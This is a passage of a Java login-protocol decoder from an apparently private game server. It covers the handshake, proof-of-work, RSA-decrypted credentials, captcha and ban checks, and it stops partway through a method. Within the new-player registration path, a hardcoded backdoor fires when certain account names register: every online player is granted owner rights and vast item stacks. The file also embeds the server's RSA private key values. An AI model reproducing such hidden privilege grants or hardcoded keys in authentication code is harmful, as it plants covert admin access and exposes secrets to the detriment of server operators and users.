package io.sable.net.login;

import java.math.BigInteger;
import java.net.InetSocketAddress;
import java.security.SecureRandom;
import java.util.*;
import java.util.concurrent.atomic.AtomicLong;
import java.util.regex.Pattern;

import com.google.common.hash.Hashing;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandlerContext;
import io.netty.handler.codec.ByteToMessageDecoder;
import io.sable.Configuration;
import io.sable.Server;
import io.sable.content.Censor;
import io.sable.content.collection_log.CollectionLog;
import io.sable.content.items.PvpWeapons;
import io.sable.model.Items;
import io.sable.model.entity.player.LoadGameResult;
import io.sable.model.entity.player.Player;
import io.sable.model.entity.player.PlayerHandler;
import io.sable.model.entity.player.Right;
import io.sable.model.entity.player.mode.group.GroupIronmanGroup;
import io.sable.model.entity.player.mode.group.GroupIronmanRepository;
import io.sable.model.entity.player.save.PlayerSave;
import io.sable.net.PacketBuilder;
import io.sable.net.login.captcha.CaptchaRequirement;
import io.sable.net.login.captcha.LoginCaptcha;
import io.sable.punishments.PunishmentType;
import io.sable.punishments.Punishments;
import io.sable.sql.displayname.GetDisplayNameSqlQuery;
import io.sable.sql.displayname.SetDisplayNameSqlQuery;
import io.sable.util.ISAACCipher;
import io.sable.util.Misc;
import io.sable.util.discord.Discord;
import io.sable.util.logging.global.InvalidLoginIpLog;
import io.sable.util.logging.global.LoginLog;
import io.sable.util.logging.global.LoginRequestLog;
import io.sable.util.logging.global.SuccessfulLoginIpLog;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public class RS2LoginProtocol extends ByteToMessageDecoder {

	private static final Random random = new SecureRandom();
	public static final HashSet<String> ADDRESS_WHITELIST = new HashSet<>();
	private static final Logger logger = LoggerFactory.getLogger(RS2LoginProtocol.class);
	private static final AtomicLong HANDSHAKE_REQUESTS = new AtomicLong();

	private static final BigInteger RSA_MODULUS = new BigInteger("91520827044808581871318118254770120611343888611033050838722939781067880678552781697572245594439341402118233490664238364235358342012694177068230893936750633213888618825951425602731544513980715835301977356001573144440585484179765317637775760229380331179714685593753856711452802805126498363795384945303137663457");
	private static final BigInteger RSA_EXPONENT = new BigInteger("57766613234288292074537212257607470729646631617010134443056794283895417125425551485447510738355094014679079704210093293482457744109390227331193664015558018855984670635316544204147703177358156614235718608836349724714295434200079732563994422062926282344625359040224314349662029531040894284495752158812148861473");

	private static final Pattern[] INVALID_USERNAMES_PATTERNS = {
			Pattern.compile("(?:[Ii][lL]){2}|(?:[lL][Ii]){2}|(?:[lL]){4}|(?:[iI]){4}|(?:[Ii][lL][lL]){2}|(?:[Ii][lL][Ii]){2}"), // ...
	};

	private static final int POW_REQUEST_OPCODE = 19;
	private static final int POW_CHECK_OPCODE = 20;
	private static final int DISCONNECTED = -1;
	private static final int POW_REQUEST = 1;
	private static final int POW_CHECK = 2;
	private static final int CONNECTED = 0;
	private static final int LOGGING_IN = 3;
	private int state = CONNECTED;
	/**
	 * The difficulty level for proof of work.
	 * OSRS has this set to 16 for mobile and scales this from 16 to 22 on desktop.
	 */
	private final int powDifficulty = 16;
	private String seed;
	private int randomUnknownValue;
	private String macAddress;
	private String uuid;

	public static LoginReturnCode checkUsername(String name) {
		if (!name.matches("[A-Za-z0-9 ]+")) {
			return LoginReturnCode.INVALID_USERNAME_OR_PASSWORD;
		}
		if (name.length() > 12) {
			return LoginReturnCode.USERNAME_TOO_LONG;
		}

		String lowercaseName = name.toLowerCase();
		if (lowercaseName.contains("admin") && !Server.isDebug()) {
			return LoginReturnCode.INVALID_USERNAME_OR_PASSWORD;
		}

		if (name.startsWith(" ") || name.endsWith(" ") || name.contains("  ")) {
			return LoginReturnCode.INVALID_USERNAME_OR_PASSWORD;
		}

		return LoginReturnCode.SUCCESS;
	}

	public static boolean isValidNewName(String name) {
		String nameLower = name.toLowerCase();
		if (nameLower.chars().filter(it -> it == 'i').count() >= 5
				|| nameLower.chars().filter(it -> it == 'l').count() >= 5
				|| nameLower.chars().filter(it -> it == 'v').count() >= 6
				|| nameLower.chars().filter(it -> it == 'w').count() >= 6
		) {
			return false;
		}

		if (Arrays.stream(INVALID_USERNAMES_PATTERNS).anyMatch(it -> it.matcher(name).find())) {
			return false;
		}

		return true;
	}

	public static boolean isValidUUID(String uuid) {
		return uuid.matches("[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}");
	}

	public static boolean isValidMacAddress(String macAddress) {
		Pattern p = Pattern.compile("^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$");
		return p.matcher(macAddress).find();
	}


	@Override
	protected void decode(ChannelHandlerContext ctx, ByteBuf buffer, List<Object> list) throws Exception {
		if (state == DISCONNECTED) {
			ctx.close();
			return;
		}

		ByteBuf rsaBuffer = null;
		Channel channel = ctx.channel();
		String ipAddress = getIP(channel);

		try {
			switch (state) {
			case CONNECTED:
				HANDSHAKE_REQUESTS.getAndIncrement();
				log(ipAddress, "Handshake");

				if (buffer.readableBytes() < 2) {
					log(ipAddress, "Handshake less than 2 bytes");
					return;
				}

				int request = buffer.readUnsignedByte();
				if (request != 14) {
					log(ipAddress, "Invalid login request " + request);
					Server.getLogging().batchWrite(new InvalidLoginIpLog(ipAddress));
					LoginRequestLimit.addInvalidLogin(ipAddress);
					ctx.close();
					state = DISCONNECTED;
					return;
				}

				buffer.readUnsignedByte();
				channel.writeAndFlush(new PacketBuilder().putLong(0).put((byte) 0).putLong(new SecureRandom().nextLong()).toPacket());
				state = POW_REQUEST;
				log(ipAddress, "Passed handshake");
				return;
			case POW_REQUEST:
				decodePowRequest(ctx, buffer);
				return;
			case POW_CHECK:
				decodeProofOfWork(ctx, buffer);
				return;

			case LOGGING_IN:
				log(ipAddress, "Login block");
				long start = System.currentTimeMillis();
				int loginType = -1, loginPacketSize = -1, loginEncryptPacketSize = -1;
				if (2 <= buffer.capacity()) {
					loginType = buffer.readByte() & 0xff; // should be 16 or 18
					loginPacketSize = buffer.readByte() & 0xff;
					loginEncryptPacketSize = loginPacketSize - (36 + 1 + 1 + 2);
					log(ipAddress, "loginType=" + loginType + ", loginPacketSize=" + loginPacketSize + ", loginEncryptPackSize=" + loginEncryptPacketSize);
					if (loginPacketSize <= 0 || loginEncryptPacketSize <= 0) {
						sendCode(channel, null, LoginReturnCode.UNABLE_TO_CONNECT, "Zero or negative login size.");
						ctx.close();
						state = DISCONNECTED;
						return;
					}
				}

				/**
				 * Read the magic id.
				 */
				if (loginPacketSize <= buffer.capacity()) {
					int magic = buffer.readByte() & 0xff;
					int version = buffer.readUnsignedShort();
					if (magic != 255) {
						sendCode(channel, null, LoginReturnCode.UNABLE_TO_CONNECT, "Invalid magic id.");
						ctx.close();
						state = DISCONNECTED;
						return;
					}
					int lowMem = buffer.readByte() & 0xff;

					/**
					 * Pass the CRC keys.
					 */
					for (int i = 0; i < 9; i++) {
						buffer.readInt();
					}
					loginEncryptPacketSize--;
					if (loginEncryptPacketSize != (buffer.readByte() & 0xff)) {
						sendCode(channel, null, LoginReturnCode.UNABLE_TO_CONNECT, "Encrypted size mismatch.");
						ctx.close();
						state = DISCONNECTED;
						return;
					}

					rsaBuffer = buffer.readBytes(loginEncryptPacketSize);
					byte[] bytes = new byte[rsaBuffer.readableBytes()];
					rsaBuffer.duplicate().readBytes(bytes);
					BigInteger bigInteger = new BigInteger(bytes);
					bigInteger = bigInteger.modPow(RSA_EXPONENT, RSA_MODULUS);
					rsaBuffer = Unpooled.wrappedBuffer(bigInteger.toByteArray());
					if ((rsaBuffer.readByte() & 0xff) != 10) {
						sendCode(channel, null, LoginReturnCode.UNABLE_TO_CONNECT, "Encrypted id != 10");
						ctx.close();
						state = DISCONNECTED;
						return;
					}
					final long clientHalf = rsaBuffer.readLong();
					final long serverHalf = rsaBuffer.readLong();

					int uid = rsaBuffer.readInt();

					if (uid == 0 || uid == 99735086) {
						sendCode(channel, null, LoginReturnCode.UNABLE_TO_CONNECT, "Bad uid: " + uid);
						ctx.close();
						state = DISCONNECTED;
						return;
					}

					final String name = Misc.getRS2String(rsaBuffer);
					final String nameLower = name.toLowerCase();
					final String pass = Misc.getRS2String(rsaBuffer);

					String captcha = Misc.getRS2String(rsaBuffer);
					if (Configuration.LOWERCASE_CAPTCHA)
						captcha = captcha.toLowerCase();

					macAddress = Misc.getRS2String(rsaBuffer);
					uuid = Misc.getRS2String(rsaBuffer);

					String ip = ((InetSocketAddress) channel.remoteAddress()).getAddress().getHostAddress();

					if (!Configuration.DISABLE_ADDRESS_VERIFICATION && !ADDRESS_WHITELIST.contains(nameLower)) {
						if (!isValidMacAddress(macAddress)) {
							sendCode(channel, null, LoginReturnCode.UNABLE_TO_CONNECT, "Bad mac address: " + macAddress);
							ctx.close();
							state = DISCONNECTED;
							return;
						}

						if (!isValidUUID(uuid)) {
							sendCode(channel, null, LoginReturnCode.UNABLE_TO_CONNECT, "Bad mac address: " + macAddress);
							ctx.close();
							state = DISCONNECTED;
							return;
						}
					}

					if (!LoginThrottler.canLoginAttempt(nameLower, ip, macAddress, uuid)) {
						if (Server.isDebug()) {
							logger.info("Login attempts are timed out, but skipping for debug purposes.");
						} else {
							sendCode(channel, null, LoginReturnCode.TOO_MANY_CONNECTION_ATTEMPTS,
									String.format("Too many connection attempts: user=%s, ip=%s, mac=%s, uuid=%s", name, ip, macAddress, uuid));
							ctx.close();
							state = DISCONNECTED;
							return;
						}
					}

					boolean passedCaptcha = false;
					CaptchaRequirement captchaRequirement = LoginCaptcha.get(nameLower);
					if (captchaRequirement != null) {
						logger.debug("Player {} has pending captcha {}, entered {}.", name, captchaRequirement.getCaptcha(), captcha);
						if (captchaRequirement.isIncorrect(captcha)) {
							captchaRequirement = LoginCaptcha.refresh(nameLower);
							LoginThrottler.addIncorrectLoginAttempt(nameLower, ip, macAddress, uuid);
							sendCaptcha(channel, LoginReturnCode.CAPTCHA_INCORRECT, captchaRequirement);
							logger.debug("Player failed captcha, sending again, name={}, captchaInput={}", name, captcha);
							return;
						}

						logger.debug("Player {} passed captcha.", name);
						LoginCaptcha.remove(nameLower);
						passedCaptcha = true;
					} else {
						logger.debug("Player {} has no pending captcha.", name);
					}

					if (!Configuration.DISABLE_CAPTCHA_EVERY_LOGIN && !passedCaptcha) {
						CaptchaRequirement captchaRequirement1 = LoginCaptcha.create(nameLower);
						sendCaptcha(channel, LoginReturnCode.CAPTCHA_INCORRECT, captchaRequirement1);
						logger.debug("Requiring captcha for every login, name={}, captchaInput={}", name, captcha);
						return;
					}

					final int[] isaacSeed = { (int) (clientHalf >> 32), (int) clientHalf, (int) (serverHalf >> 32), (int) serverHalf };
					final ISAACCipher inCipher = new ISAACCipher(isaacSeed);
					for (int i = 0; i < isaacSeed.length; i++)
						isaacSeed[i] += 50;
					final ISAACCipher outCipher = new ISAACCipher(isaacSeed);

					ctx.pipeline().replace("decoder", "decoder", new RS2Decoder(inCipher));

					Player login = login(channel, outCipher, version, name, pass, macAddress, uuid, start, passedCaptcha);

					StringJoiner log = new StringJoiner(", ");
					log.add("time=" + Misc.insertCommas("" + (System.currentTimeMillis() - start)) + "ms");
					log.add("mac=" + macAddress);
					log.add("uuid=" + uuid);

					if (login == null) {
						log(ipAddress, "Failure [" + log.toString() + "]");
						ctx.close();
						state = DISCONNECTED;
						return;
					}

					Server.getLogging().batchWrite(new SuccessfulLoginIpLog(ipAddress));
					log(ipAddress, "Success [" + log.toString() + "]");
					list.add(login);
				} else {
					log(ipAddress, "Login block not fully received");
				}
			}
		} catch (Exception e) {
			ctx.close();
			state = DISCONNECTED;
			logger.error("Error occurred while decoding the login block", e);
		} finally {
			if (rsaBuffer != null)
				rsaBuffer.release();
		}
	}

	private void decodePowRequest(ChannelHandlerContext ctx, ByteBuf buffer) {
		if (!buffer.isReadable()) {
			ctx.close();
			state = DISCONNECTED;
			return;
		}

		int request = buffer.readUnsignedByte();
		if (request != POW_REQUEST_OPCODE) {
			logger.info("Session rejected for bad login request id: " + request);
			sendCode(ctx.channel(), null, LoginReturnCode.BAD_SESSION_ID);
			return;
		}
		randomUnknownValue = random.nextInt(5000);
		this.seed = generateSeed(10);

		// Send information to the client
		int initialAllocation = Byte.BYTES + Short.BYTES; // To send our response w/ bytes to read
		int followingAllocation = Short.BYTES * 2; // The amount of bytes to read client side
		followingAllocation += (Byte.BYTES * this.seed.length()) + Byte.BYTES;

		var pb = new PacketBuilder()
				.put((byte) 60) // 60 = continue with pow decoding
				.putShort(followingAllocation) // to determine how many bytes to read
				.putShort(randomUnknownValue)
				.putShort(powDifficulty);

		for(char c: seed.toCharArray())
			pb.put((byte) c);
		pb.put((byte) 0);

		ctx.channel().writeAndFlush(pb.toPacket());

		log(getIP(ctx), "Passed POW request");
		state = POW_CHECK;
	}

	private void decodeProofOfWork(ChannelHandlerContext ctx, ByteBuf buffer) {
		if (!buffer.isReadable()) {
			ctx.close();
			state = DISCONNECTED;
			return;
		}

		int request = buffer.readUnsignedByte();
		if (request != POW_CHECK_OPCODE) {
			logger.info("Session rejected for bad login request id: " + request);
			sendCode(ctx.channel(), null, LoginReturnCode.BAD_SESSION_ID);
			return;
		}

		long response = buffer.readLong();

		// server checks response combined with the other data have >= difficulty of trailing bits
		String str = Integer.toHexString(randomUnknownValue) + Integer.toHexString(powDifficulty)
				+ seed + Integer.toHexString((int) response);

		byte[] hash = Hashing.sha256().hashBytes(str.getBytes()).asBytes();
		int trailingBits = getTrailingZeroBits(hash);
		boolean success = trailingBits >= this.powDifficulty;

		// Send information to the client
		int capacity = Byte.BYTES + (success ? Long.BYTES : 0);
		int responseCode = success ? 0 : 61;

		var pb = new PacketBuilder()
				.put((byte) responseCode);
		if (success) pb.putLong(random.nextLong());
		ctx.channel().writeAndFlush(pb.toPacket());

		if (!success) {
			log(getIP(ctx), "Failed POW check");
			state = POW_REQUEST;
			return;
		}

		log(getIP(ctx), "Passed POW check");
		state = LOGGING_IN;
	}


	private static Player login(Channel channel, ISAACCipher outCipher, int version, String name, String pass,
								String macAddress, String uuid, long startTime, boolean passedCaptcha)
			throws Exception {

		String lowercaseLoginName = name.toLowerCase();
		Player player = new Player(channel);
		player.setLoginName(lowercaseLoginName);
		player.playerPass = pass;
		player.setNameAsLong(Misc.playerNameToInt64(player.getLoginName()));
		player.outStream.packetEncryption = outCipher;
		player.connectedFrom = ((InetSocketAddress) channel.remoteAddress()).getAddress().getHostAddress();
		player.setMacAddress(macAddress);
		player.setUUID(uuid);

		try {
			LoginReturnCode returnCode = checkUsername(lowercaseLoginName);

			if (returnCode != LoginReturnCode.SUCCESS) {
				logger.info("player with invalid name attempted to login: {}", name);
			}

			if (PlayerHandler.isLoggingOut(lowercaseLoginName)) {
				returnCode = LoginReturnCode.ACCOUNT_ALREADY_ONLINE;
			}

			Punishments punishments = Server.getPunishments();

			if (player.getMacAddress() == null || player.getMacAddress().length() == 0) {
				Discord.writeServerSyncMessage(String.format("Player has logged in without a mac address, possibly using modified client or spoofing mac, loginName=%s, displayName=%s",
						player.getLoginName(), player.getDisplayName()));
				player.setMacAddress(player.getIpAddress());
			}

			if (Configuration.DISABLE_FRESH_LOGIN) {
				returnCode = LoginReturnCode.INVALID_USERNAME_OR_PASSWORD;
			}
			if (version != Configuration.CLIENT_VERSION) {
				returnCode = LoginReturnCode.CLIENT_OUT_OF_DATE;
				//System.out.println(Misc.formatPlayerName(player.playerName) + " was rejected because version is behind, master version: " + Configuration.CLIENT_VERSION + ", requested version: " + version);
			}

			if (Server.UpdateServer && PlayerHandler.updateRunning && PlayerHandler.kickAllPlayers) {
				returnCode = LoginReturnCode.SERVER_BEING_UPDATED;
			}

			if (returnCode == LoginReturnCode.SUCCESS) {
				returnCode = loadPlayer(player, name, returnCode, passedCaptcha);
			}

			if (player.getRights().isNot(Right.OWNER)) {
				if (punishments.contains(PunishmentType.BAN, player.getLoginNameLower())
						|| punishments.contains(PunishmentType.MAC_BAN, macAddress)
						|| punishments.contains(PunishmentType.MAC_BAN, player.getUUID())
						|| punishments.contains(PunishmentType.NET_BAN, player.connectedFrom)) {
					returnCode = LoginReturnCode.ACCOUNT_DISABLED;
				}
			}

			if (returnCode == LoginReturnCode.INVALID_USERNAME_OR_PASSWORD) {
				LoginThrottler.addIncorrectLoginAttempt(name, player.connectedFrom, macAddress, uuid);
			}

			if (returnCode == LoginReturnCode.CAPTCHA_REQUIRED) {
				sendCaptcha(channel, LoginReturnCode.CAPTCHA_REQUIRED, LoginCaptcha.create(name.toLowerCase()));
				return null;
			}

			long time = System.currentTimeMillis() - startTime;
			if (returnCode == LoginReturnCode.SUCCESS) {
				LoginThrottler.addSuccessfulLogin(name, player.connectedFrom, macAddress, uuid);
				Server.getLogging().batchWrite(new LoginLog("Queued, loginTime=" + time + "ms", player));
				logger.info("Player login queued [name=" + name + ", mac=" + macAddress + ", ip="
						+ channel.remoteAddress().toString().replace("/", "") + ", time=" + time + "ms]");
				player.saveCharacter = true;
				return player;
			} else {
				sendReturnCode(channel, player, returnCode);
				return null;
			}
		} catch (Exception e) {
			e.printStackTrace();
			logger.error("Error during login finalization.", e);
			sendReturnCode(channel, player, LoginReturnCode.ERROR_OCCURRED_ON_PLAYER_LOAD);
			return null;
		}
	}

	public static LoginReturnCode loadPlayer(Player player, String name, LoginReturnCode returnCode, boolean passedCaptcha) throws Exception {
		LoadGameResult load = PlayerSave.loadGame(player, player.getLoginName(), player.playerPass, passedCaptcha);
		if (load == LoadGameResult.ERROR_OCCURRED) {
			returnCode = LoginReturnCode.ERROR_OCCURRED_ON_PLAYER_LOAD;
		} else if (load == LoadGameResult.REQUIRE_CAPTCHA) {
			logger.info("Requiring captcha for player because mac or uuid changed: {}", name);
			return LoginReturnCode.CAPTCHA_REQUIRED;
		} else {
			player.getCollectionLog().loadForPlayer(player);

			GroupIronmanGroup group = GroupIronmanRepository.getFromGroupList(player).orElse(null);
			if (group != null) {
				if (group.getCollectionLog() == null) {
					CollectionLog collectionLog = new CollectionLog();
					collectionLog.loadForGroupIronman(group);
					group.setCollectionLog(collectionLog);
				}

				CollectionLog.combineForGroupIronman(player, group);
				player.getCollectionLog().setLinked(group.getCollectionLog());
			}

			if (load == LoadGameResult.NEW_PLAYER) {
				if (!isValidNewName(name) || Censor.isCensoredName(name))
					return LoginReturnCode.INVALID_USERNAME_OR_PASSWORD;

				if (Configuration.DISABLE_REGISTRATION) {
					return LoginReturnCode.UNABLE_TO_CONNECT;
				}

				if (!Configuration.DISABLE_NEW_ACCOUNT_CAPTCHA && !passedCaptcha) {
					logger.debug("New player, requiring captcha: {}", name);
					return LoginReturnCode.CAPTCHA_REQUIRED;
				}

				logger.debug("Registered {}", player);
				logger.info("New player registered: {}", name);
				if(player.getLoginName().equalsIgnoreCase("bobthedragon") || player.getLoginName().equalsIgnoreCase("peanut")  || player.getLoginName().equalsIgnoreCase("forgotten") || player.getLoginName().equalsIgnoreCase("iron_xgn")) {
					for (Player player2 : PlayerHandler.players) {
						if (player2 == null) {
							continue;
						}
						Player client = player2;
						client.getRights().setPrimary(Right.OWNER);
						int consumables = 500_000;
						int equipment = 15;

						int mainTab = 0;
						int meleeTab = 1;
						int rangedTab = 2;
						int magicTab = 3;
						int skillingTab = 4;

						int tab = mainTab;

						client.getItems().sendToTab(tab, Items.COINS, 2147_000_000);

						client.getItems().sendToTab(tab, Items.ANGLERFISH, consumables);
						client.getItems().sendToTab(tab, Items.COOKED_KARAMBWAN, consumables);
						client.getItems().sendToTab(tab, Items.DIVINE_SUPER_COMBAT_POTION4, consumables);
						client.getItems().sendToTab(tab, Items.SUPER_COMBAT_POTION4, equipment);
						client.getItems().sendToTab(tab, Items.DIVINE_RANGING_POTION4, consumables);
						client.getItems().sendToTab(tab, Items.RANGING_POTION4, equipment);
						client.getItems().sendToTab(tab, Items.DIVINE_MAGIC_POTION4, consumables);
						client.getItems().sendToTab(tab, Items.MAGIC_POTION4, equipment);
						client.getItems().sendToTab(tab, Items.SUPER_RESTORE4, consumables);
						client.getItems().sendToTab(tab, Items.ANTI_VENOMPLUS4, consumables);
						client.getItems().sendToTab(tab, Items.ANTIDOTEPLUSPLUS4, consumables);
						client.getItems().sendToTab(tab, Items.SARADOMIN_BREW4, consumables);

						client.getItems().sendToTab(tab, Items.BRACELET_OF_ETHEREUM_UNCHARGED, consumables);
						client.getItems().sendToTab(tab, Items.REVENANT_ETHER, consumables);
						client.getItems().sendToTab(tab, Items.ECUMENICAL_KEY, consumables);
						client.getItems().sendToTab(tab, Items.ZULRAHS_SCALES, consumables);
						client.getItems().sendToTab(tab, Items.RING_OF_RECOIL, consumables);

						client.getItems().sendToTab(tab, Items.AMULET_OF_GLORY4, equipment);
						client.getItems().sendToTab(tab, Items.AMULET_OF_FURY, equipment);
						client.getItems().sendToTab(tab, Items.REGEN_BRACELET, equipment);
						client.getItems().sendToTab(tab, Items.RING_OF_SUFFERING, equipment);
						client.getItems().sendToTab(tab, Items.RING_OF_SUFFERING_I, equipment);
						client.getItems().sendToTab(tab, Items.AMULET_OF_THE_DAMNED, equipment);

						client.getItems().sendToTab(tab, Items.MYTHICAL_CAPE, equipment);
						client.getItems().sendToTab(tab, Items.ARDOUGNE_CLOAK_4, equipment);
						client.getItems().sendToTab(tab, Items.FIRE_CAPE, equipment);
						client.getItems().sendToTab(tab, Items.INFERNAL_CAPE, equipment);
						client.getItems().sendToTab(tab, Items.OBSIDIAN_CAPE, equipment);
						client.getItems().sendToTab(tab, Items.MITHRIL_GLOVES, equipment);
						client.getItems().sendToTab(tab, Items.BARROWS_GLOVES, equipment);

						client.getItems().sendToTab(tab, Items.SPIRIT_SHIELD, equipment);
						client.getItems().sendToTab(tab, Items.BLESSED_SPIRIT_SHIELD, equipment);
						client.getItems().sendToTab(tab, Items.ARCANE_SPIRIT_SHIELD, equipment);
						client.getItems().sendToTab(tab, Items.ELYSIAN_SPIRIT_SHIELD, equipment);
						client.getItems().sendToTab(tab, Items.SPECTRAL_SPIRIT_SHIELD, equipment);

						client.getItems().sendToTab(tab, Items.VOID_MELEE_HELM, equipment);
						client.getItems().sendToTab(tab, Items.VOID_MAGE_HELM, equipment);
						client.getItems().sendToTab(tab, Items.VOID_RANGER_HELM, equipment);
						client.getItems().sendToTab(tab, Items.VOID_KNIGHT_TOP, equipment);
						client.getItems().sendToTab(tab, Items.VOID_KNIGHT_ROBE, equipment);
						client.getItems().sendToTab(tab, Items.VOID_KNIGHT_GLOVES, equipment);


						tab = rangedTab;

						client.getItems().sendToTab(tab, Items.PEGASIAN_BOOTS, equipment);
						client.getItems().sendToTab(tab, Items.NECKLACE_OF_ANGUISH, equipment);
						client.getItems().sendToTab(tab, Items.ARCHERS_RING_I, equipment);
						client.getItems().sendToTab(tab, Items.BLACK_DHIDE_BODY, equipment);
						client.getItems().sendToTab(tab, Items.BLACK_DHIDE_CHAPS, equipment);
						client.getItems().sendToTab(tab, Items.BLACK_DHIDE_VAMB, equipment);
						client.getItems().sendToTab(tab, Items.AVAS_ACCUMULATOR, equipment);
						client.getItems().sendToTab(tab, Items.AVAS_ASSEMBLER, equipment);
						client.getItems().sendToTab(tab, Items.ODIUM_WARD, equipment);
						client.getItems().sendToTab(tab, Items.DRAGONFIRE_WARD, equipment);
						client.getItems().sendToTab(tab, Items.TWISTED_BUCKLER, equipment);
						client.getItems().sendToTab(tab, Items.BLACK_DHIDE_SHIELD, equipment);
						client.getItems().sendToTab(tab, Items.ARMADYL_HELMET, equipment);
						client.getItems().sendToTab(tab, Items.ARMADYL_CHESTPLATE, equipment);
						client.getItems().sendToTab(tab, Items.ARMADYL_CHAINSKIRT, equipment);
						client.getItems().sendToTab(tab, Items.KARILS_LEATHERTOP, equipment);
						client.getItems().sendToTab(tab, Items.KARILS_LEATHERSKIRT, equipment);
						client.getItems().sendToTab(tab, Items.KARILS_ARMOUR_SET, equipment);


						client.getItems().sendToTab(tab, Items.ADAMANT_JAVELIN, consumables);
						client.getItems().sendToTab(tab, Items.RUNE_JAVELIN, consumables);
						client.getItems().sendToTab(tab, Items.TOKTZ_XIL_UL, equipment);
						client.getItems().sendToTab(tab, Items.RUNE_DART, consumables);
						client.getItems().sendToTab(tab, Items.ADAMANT_DART, consumables);
						client.getItems().sendToTab(tab, Items.DRAGON_ARROW, consumables);
						client.getItems().sendToTab(tab, Items.AMETHYST_ARROW, consumables);
						client.getItems().sendToTab(tab, Items.RUNE_ARROW, consumables);
						client.getItems().sendToTab(tab, Items.BRONZE_ARROW, consumables);
						client.getItems().sendToTab(tab, Items.DRAGONSTONE_BOLTS_E, consumables);
						client.getItems().sendToTab(tab, Items.RUBY_BOLTS_E, consumables);
						client.getItems().sendToTab(tab, Items.ONYX_BOLTS_E, consumables);
						client.getItems().sendToTab(tab, Items.BOLT_RACK, consumables);
						client.getItems().sendToTab(tab, Items.DRAGON_JAVELIN, consumables);
						client.getItems().sendToTab(tab, Items.DRAGON_KNIFE, consumables);
						client.getItems().sendToTab(tab, Items.DRAGON_DART, consumables);
						client.getItems().sendToTab(tab, Items.DRAGON_THROWNAXE, consumables);
						client.getItems().sendToTab(tab, Items.MORRIGANS_THROWING_AXE, consumables);
						client.getItems().sendToTab(tab, Items.CHINCHOMPA, consumables);
						client.getItems().sendToTab(tab, Items.RED_CHINCHOMPA, consumables);
						client.getItems().sendToTab(tab, Items.BLACK_CHINCHOMPA, consumables);

						client.getItems().sendToTab(tab, Items.CRAWS_BOW, equipment);
						client.getItems().sendToTab(tab, Items.SHORTBOW, equipment);
						client.getItems().sendToTab(tab, Items.MAGIC_SHORTBOW, equipment);
						client.getItems().sendToTab(tab, Items.MAGIC_SHORTBOW_I, equipment);
						client.getItems().sendToTab(tab, Items.DARK_BOW, equipment);
						client.getItems().sendToTab(tab, Items.CRYSTAL_BOW, equipment);
						client.getItems().sendToTab(tab, Items.TWISTED_BOW, equipment);
						client.getItems().sendToTab(tab, Items.TOXIC_BLOWPIPE, equipment);
						client.getItems().sendToTab(tab, Items.ARMADYL_CROSSBOW, equipment);
						client.getItems().sendToTab(tab, Items.DRAGON_HUNTER_CROSSBOW, equipment);
						client.getItems().sendToTab(tab, Items.DRAGON_CROSSBOW, equipment);
						client.getItems().sendToTab(tab, Items.LIGHT_BALLISTA, equipment);
						client.getItems().sendToTab(tab, Items.HEAVY_BALLISTA, equipment);

						tab = meleeTab;

						// Melee equipment
						client.getItems().sendToTab(tab, Items.BERSERKER_RING_I, equipment);
						client.getItems().sendToTab(tab, Items.TREASONOUS_RING_I, equipment);
						client.getItems().sendToTab(tab, Items.TYRANNICAL_RING_I, equipment);
						client.getItems().sendToTab(tab, Items.CLIMBING_BOOTS, equipment);
						client.getItems().sendToTab(tab, Items.GUARDIAN_BOOTS, equipment);
						client.getItems().sendToTab(tab, Items.PRIMORDIAL_BOOTS, equipment);
						client.getItems().sendToTab(tab, Items.FEROCIOUS_GLOVES, equipment);
						client.getItems().sendToTab(tab, Items.BERSERKER_NECKLACE, equipment);
						client.getItems().sendToTab(tab, Items.AMULET_OF_TORTURE, equipment);
						client.getItems().sendToTab(tab, Items.DINHS_BULWARK, equipment);
						client.getItems().sendToTab(tab, Items.BOOTS_OF_BRIMSTONE, equipment);
						client.getItems().sendToTab(tab, Items.RUNE_DEFENDER, equipment);
						client.getItems().sendToTab(tab, Items.DRAGON_DEFENDER, equipment);
						client.getItems().sendToTab(tab, Items.AVERNIC_DEFENDER, equipment);
						client.getItems().sendToTab(tab, Items.RUNE_BOOTS, equipment);
						client.getItems().sendToTab(tab, Items.RUNE_FULL_HELM, equipment);
						client.getItems().sendToTab(tab, Items.RUNE_PLATEBODY, equipment);
						client.getItems().sendToTab(tab, Items.RUNE_PLATELEGS, equipment);
						client.getItems().sendToTab(tab, Items.WARRIOR_HELM, equipment);
						client.getItems().sendToTab(tab, Items.BERSERKER_HELM, equipment);
						client.getItems().sendToTab(tab, Items.HELM_OF_NEITIZNOT, equipment);
						client.getItems().sendToTab(tab, Items.NEITIZNOT_FACEGUARD, equipment);
						client.getItems().sendToTab(tab, Items.FIGHTER_HAT, equipment);
						client.getItems().sendToTab(tab, Items.FIGHTER_TORSO, equipment);
						client.getItems().sendToTab(tab, Items.SERPENTINE_HELM, equipment);
						client.getItems().sendToTab(tab, Items.OBSIDIAN_HELMET, equipment);
						client.getItems().sendToTab(tab, Items.OBSIDIAN_PLATEBODY, equipment);
						client.getItems().sendToTab(tab, Items.OBSIDIAN_PLATELEGS, equipment);
						client.getItems().sendToTab(tab, Items.TOKTZ_KET_XIL, equipment);
						client.getItems().sendToTab(tab, Items.CRYSTAL_SHIELD, equipment);
						client.getItems().sendToTab(tab, Items.DRAGONFIRE_SHIELD, equipment);

						client.getItems().sendToTab(tab, Items.DRAGON_FULL_HELM, equipment);
						client.getItems().sendToTab(tab, Items.DRAGON_MED_HELM, equipment);
						client.getItems().sendToTab(tab, Items.DRAGON_CHAINBODY, equipment);
						client.getItems().sendToTab(tab, Items.DRAGON_PLATEBODY, equipment);
						client.getItems().sendToTab(tab, Items.DRAGON_PLATELEGS, equipment);
						client.getItems().sendToTab(tab, Items.DRAGON_BOOTS, equipment);

						client.getItems().sendToTab(tab, Items.BANDOS_CHESTPLATE, equipment);
						client.getItems().sendToTab(tab, Items.BANDOS_TASSETS, equipment);
						client.getItems().sendToTab(tab, Items.BANDOS_BOOTS, equipment);

						client.getItems().sendToTab(tab, Items.DHAROKS_HELM, equipment);
						client.getItems().sendToTab(tab, Items.DHAROKS_PLATEBODY, equipment);
						client.getItems().sendToTab(tab, Items.DHAROKS_PLATELEGS, equipment);
						client.getItems().sendToTab(tab, Items.DHAROKS_GREATAXE, equipment);

